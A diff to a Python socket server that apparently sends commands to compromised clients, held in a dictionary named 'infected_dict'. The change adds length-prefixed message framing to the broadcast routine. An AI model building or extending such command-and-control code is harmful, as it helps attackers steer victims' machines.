@@ -1,6 +1,7 @@
 import socket
 import select
 import sys
+import struct
 
 def server():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -117,13 +118,18 @@ def send_message(message, infected_dict):
         return 0
         
     target = parts[0]
-    final_mess = parts[1] + "\n"
     
+    
+    
+    final_mess = parts[1] + "\n"
+    lenHeader = len(final_mess.encode("utf-8"))
+    header = struct.pack("<I", lenHeader)
+
     
     if target == "*":
         for name,socket_client in infected_dict.items():
             try:
-                socket_client.send(final_mess.encode("utf-8"))
+                socket_client.send(header + final_mess.encode("utf-8"))
             except Exception:
                 pass
     else:
